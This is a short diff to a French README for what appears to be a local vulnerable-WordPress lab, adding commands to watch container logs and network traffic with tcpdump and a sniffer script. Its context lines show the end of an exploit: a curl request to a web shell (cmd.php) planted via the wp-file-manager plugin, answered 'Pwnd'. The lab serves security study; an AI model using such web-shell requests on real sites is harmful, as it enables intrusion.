@@ -65,3 +65,21 @@ curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/cmd.ph
 
 Pwnd
 ```
+
+
+# Traces 
+
+Trace dockers du serveur web/mariadb
+```
+docker compose logs -f
+```
+
+Traces réseau du containers: tcpdump
+```
+sudo tcpdump -i any
+```
+
+Traces réseau du containers: script python
+```
+sudo ./sniffer.py $(./getdockerif.sh wordpressvuln_wordpress_1)
+```
